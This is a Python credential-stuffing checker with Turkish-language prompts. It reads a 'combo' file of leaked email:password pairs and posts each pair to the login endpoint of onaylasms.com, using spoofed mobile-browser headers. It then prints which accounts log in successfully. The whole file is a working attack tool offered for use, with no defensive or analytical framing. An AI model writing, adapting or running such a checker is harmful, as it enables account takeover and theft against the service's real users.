import requests
import os
try:
    from cfonts import render
except:
    os.system('pip install python-cfonts')

output = render('ONAYLASMS ', colors=['white', 'blue'], align='center')
print(output)

combo_file_path = input("Combo dosyasının yolunu girin: ")

url = "https://onaylasms.com/ajax/login"

headers = {
    'authority': 'onaylasms.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://onaylasms.com',
    'referer': 'https://onaylasms.com/login',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'
ITALIC = '\033[3m'
UNDERLINE = '\033[4m'

with open(combo_file_path, 'r') as combo_file:
    for line in combo_file:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':', 1)
        else:
            continue

        data = {
            'email': email,
            'password': password,
        }

        response = requests.post(url, data=data, headers=headers)

        try:
            response_data = response.json()
        except ValueError:
            print(f"{email} - Yanıt alınamadı.")
            continue

        if response_data.get("success"):
            print(f"{GREEN}{BOLD}{email} - {password} - BAŞARILI GİRİŞ ✅{RESET}")
        else:
            print(f"{RED}{UNDERLINE}{email} - {password} - BAŞARISIZ GİRİŞ ❌{RESET}")
